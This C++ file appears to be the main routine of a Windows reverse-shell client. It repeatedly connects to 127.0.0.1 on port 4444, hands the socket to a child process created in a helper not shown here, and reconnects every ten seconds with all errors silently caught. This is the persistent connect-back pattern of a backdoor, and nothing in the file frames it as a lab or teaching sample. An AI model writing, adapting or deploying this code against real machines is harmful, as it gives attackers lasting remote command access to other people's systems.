#define WIN32_LEAN_AND_MEAN

#include <iostream>
#include <windows.h>

#include "Client.h"
#include "Process.h"

int main() {
	while (true) {
		try {
			printf("\n->Connecting to server\n");
			SOCKET ConnectSocket = NULL;
			while (ConnectSocket == NULL) {
				ConnectSocket = ConnectServer("127.0.0.1", "4444");
			}

			// Set the bInheritHandle flag so pipe handles are inherited. 
			SECURITY_ATTRIBUTES saAttr;

			saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
			saAttr.bInheritHandle = TRUE;
			saAttr.lpSecurityDescriptor = NULL;

			printf("\n->Creating Child Process\n");

			PPROCESS_INFORMATION piProcInfo = NULL;

			while (piProcInfo == NULL) {
				piProcInfo = CreateChildProcess(ConnectSocket);
			}

			printf("\n->Waiting for Child Process to End\n");

			WaitForSingleObject(piProcInfo->hProcess, INFINITE);

			// Close handles to the child process and its primary thread.
			// Some applications might keep these handles to monitor the status
			// of the child process, for example. 
			printf("\n->Closing Handles\n");
			CloseHandle(piProcInfo->hProcess);
			CloseHandle(piProcInfo->hThread);
			free(piProcInfo);
			WSACleanup();
		}
		catch (...) {
		}
		Sleep(10000);
	}
}